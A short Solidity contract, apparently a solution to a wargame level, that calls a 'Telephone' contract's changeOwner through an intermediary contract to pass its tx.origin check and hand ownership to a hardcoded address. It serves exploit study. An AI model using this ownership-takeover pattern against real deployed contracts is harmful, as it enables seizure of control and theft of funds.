pragma solidity ^0.6.0;

import "./Telephone.sol";

contract teleAttack {
    Telephone public targetContract;

    constructor(address _target) public {
        targetContract = Telephone(_target);
    }

    function changeOwner() public {
        targetContract.changeOwner(0xde21750cf3A76931bAAc0A91e75706e6B3bEa1c5);
    }
}